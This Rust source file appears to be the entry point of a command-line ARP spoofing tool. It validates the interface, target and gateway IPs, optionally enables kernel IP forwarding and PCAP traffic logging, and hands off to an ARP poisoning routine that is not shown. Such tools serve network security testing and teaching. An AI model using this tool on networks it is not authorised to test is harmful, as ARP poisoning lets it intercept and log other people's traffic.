extern crate argparse;
extern crate nix;
extern crate pcap;

use std::net::Ipv4Addr;
use std::process;
use std::result::Result;
use std::str::FromStr;

use nix::sys::signal;
use nix::sys::signal::SigHandler;
use pcap::Device;
use clap::Parser;

use crate::utils::{
    resolve_private_ipv4,
    get_interface_mac_addr, 
    mac_to_string, 
    ip_forward,
};

mod arp;
mod utils;
mod error;

use error::{CliError, NetUtilsError};


macro_rules! abort {
    ($($arg:tt)*) => {{
        println!($($arg)*);
        process::exit(1);
    }};
}

#[derive(Parser, Debug)]
#[command(name = "arp-spoof")]
#[command(version = env!("CARGO_PKG_VERSION"))]
#[command(
    help_template = "\n{name}\nVersion: {version}\n{about}\n\n{usage-heading} {usage} \n\n {all-args} {tab}\n\n"
)]
#[command(about, long_about = None)]
/// Minimal ARP spoofing tool written in Rust.
struct Cli {
    #[arg(short = 'i', long = "interface")]
    /// Name of local interface used for sending/receiving ARP and data packets 
    interface: String,

    #[arg(short = 't', long = "target_ip")]
    /// IP address of target device
    target_ip: String,

    #[arg(short = 'g', long = "gateway_ip")]
    /// IP address of network gateway
    gateway_ip: String,

    #[arg(short = 'f', long = "forward_traffic")]
    /// Flag which enables/disables your device forwarding the packets it receives
    ip_forward: bool, // Defaults to false

    #[arg(short = 'l', long = "log_traffic")]
    /// Flag which enables/disables logging the received packets in a PCAP file
    log_traffic: bool, // Defaults to false
}

impl Cli {
    // Performs initial check of arguments supplied
    pub fn validate_args(&mut self) -> Result<Device, CliError> {
        // Check if an interface was supplied
        if self.interface.is_empty() {
            return Err(CliError::InterfaceEmpty);
        }

        // Check if given interface is present
        let all_devices = match Device::list() {
            Ok(devices) => devices, // Vector of available network devices which can be opened with pcap
            Err(e) => return Err(CliError::DeviceListError(e.to_string())),
        };

        let device = all_devices
            .into_iter()
            .filter(|d| d.name == self.interface)
            .last();

        if device.is_none() {
            return Err(CliError::InterfaceNotFound(self.interface.clone()));
        }

        // Check if a target_ip was supplied
        if self.target_ip.is_empty() {
            return Err(CliError::TargetIpEmpty);
        }

        // Check if target_ip is valid
        match Ipv4Addr::from_str(&self.target_ip) {
            Ok(_) => {},
            Err(e) => return Err(CliError::TargetIpInvalid(e.to_string())),
        }

        // Check if target_ip is private
        if !Ipv4Addr::from_str(&self.target_ip).unwrap().is_private() {
            return Err(CliError::TargetIpNotPrivate);
        }

        // Check if gateway IP was supplied
        if self.gateway_ip.is_empty() {
            return Err(CliError::GatewayEmpty);
        }

        // Check if gateway IP address is valid
        match Ipv4Addr::from_str(&self.gateway_ip) {
            Ok(_) => {},
            Err(e) => return Err(CliError::GatewayInvalid(e.to_string())),
        }

        // Check if gateway IP is private
        if !Ipv4Addr::from_str(&self.gateway_ip).unwrap().is_private() {
            return Err(CliError::GatewayNotPrivate);
        }

        // Return the device from here to save from having to assign again in main
        Ok(device.unwrap())
    }
}

/// extern "C" sigint handler
extern "C" fn handle_sigint(_: i32) {
    match ip_forward(false) {
        Ok(_) => (),
        Err(e) => println!("{}", e),
    }
    abort!("\nInterrupted!");
}

fn main() -> Result<(), NetUtilsError> {
    // Parse and validate arguments - Program does not proceed if any errors returned
    let mut args = Cli::parse(); 
    let device = match args.validate_args() {
        Ok(device) => device,
        Err(e) => {
            eprintln!("Error: {}\n", e);
            println!("{}\n     {}\n", "Usage:", "target/release/arp-spoof [OPTIONS] -i <INTERFACE> -t <TARGET_IP> -g <GATEWAY_IP>");
            println!("For more information try -h or --help");
            std::process::exit(1);
        }
    };       

    // Define SIGINT handler
    let sig_action = signal::SigAction::new(
        SigHandler::Handler(handle_sigint),
        signal::SaFlags::empty(),
        signal::SigSet::empty(),
    );
    unsafe {
        signal::sigaction(
            signal::SIGINT, 
            &sig_action
        ).expect("Unable to register SIGINT handler");
    }

    // Get private IPv4 address associated with given interface - soft exit if not found
    let interface_ipv4_addr = resolve_private_ipv4(&device)?;
    
    // Retreive MAC address of given interface
    let interface_mac_addr = get_interface_mac_addr(&args.interface)?;


    // Enable kernel ip forwarding
    if args.ip_forward {
        ip_forward(args.ip_forward)?;
    }

    println!("========================== Network Interface Info ==========================");
    println!(
        "Interface:            {}\nIPv4 Address:         {}\nMAC Address:          {}\nConnection Status:    {:?}",
        device.name,
        interface_ipv4_addr,
        mac_to_string(&interface_mac_addr),
        device.flags.connection_status
    );
    println!("============================================================================\n");
    
    println!("========================== Tool Configuration ==============================");
    println!("IPv4 Traffic Forwarding:     {}", if args.ip_forward { "Enabled" } else { "Disabled" });
    println!("PCAP Traffic Logging:        {}", if args.log_traffic { "Enabled" } else { "Disabled" });
    println!("============================================================================");
    

    arp::arp_poisoning(
        device,
        interface_mac_addr,
        interface_ipv4_addr,
        Ipv4Addr::from_str(&args.target_ip)?,
        Ipv4Addr::from_str(&args.gateway_ip)?,
        args.log_traffic,
    );

    Ok(())
}

